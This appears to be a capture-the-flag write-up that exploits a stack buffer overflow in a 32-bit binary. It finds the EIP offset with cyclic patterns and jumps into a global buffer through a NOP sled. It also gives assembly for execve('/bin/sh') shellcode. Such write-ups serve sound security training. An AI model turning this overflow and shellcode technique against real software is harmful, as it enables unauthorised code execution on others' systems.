## Challange
Inject a shellcode and get read the flag.
## Solution
First by using ghidra decompile the file and inside the `get_name(buffer)` function there is an overflow. Since the buffer declared in `prog()` has a size of 208 but the `read` in `get_name` takes 1000 characters which are copied in the buffer prog reference.
There is a problem: if in the first 1000 characters there is a `\0` (EOF) the loop break and is impossible to return.
To solve:
1. Since is a x86 architecture we use `cyclic 1000` to generate a pattern and find when overflow the EIP. We get invalid address in EIP of value `0x63616164`, by doing `cyclic -l 0x63616164` we get the offset of 212. The first part of our payload will be `"A"*212`.
2. By inspecting ghidra we find the address of the buffer (the global one), stored in the .bss section `0x804c060`. Since our shellcode requires `\x00` after the string `/bin/sh` we can't put the shellcode in the begin otherwise the read will truncate the exploit, so we put it in the end, check step 3.
The address that will overwrite EIP will be `0x804C13A` which is the base address of the buffer plus 212 and something else. In this way the return will jump in the final portion of the explit, where is the shellcode.
3. Until now we have `"A"*212 + p32(0x804C13A)`. We still need padding to reach 1000 characters and the shellcode. To do so, we write the shellcode:
```assembly
jmp binsh
back:
xor eax, eax
mov al, 0xb
pop ebx
xor ecx, ecx
xor edx, edx
int 0x80

binsh:
call back
nop
nop
```
In `ebx` there will be the address of the first nop after `call back`. So when we will write the exploit we'll substitute with `/bin/sh`.
After the address we put `\x90` to reach `1004-len(shellcode)`(`-4` because the 0's after `/bin/sh`) and then the shellcode. Since the EIP is pointing in one of the `\x90` position, after return these will be executed and eventually do also the shellcode.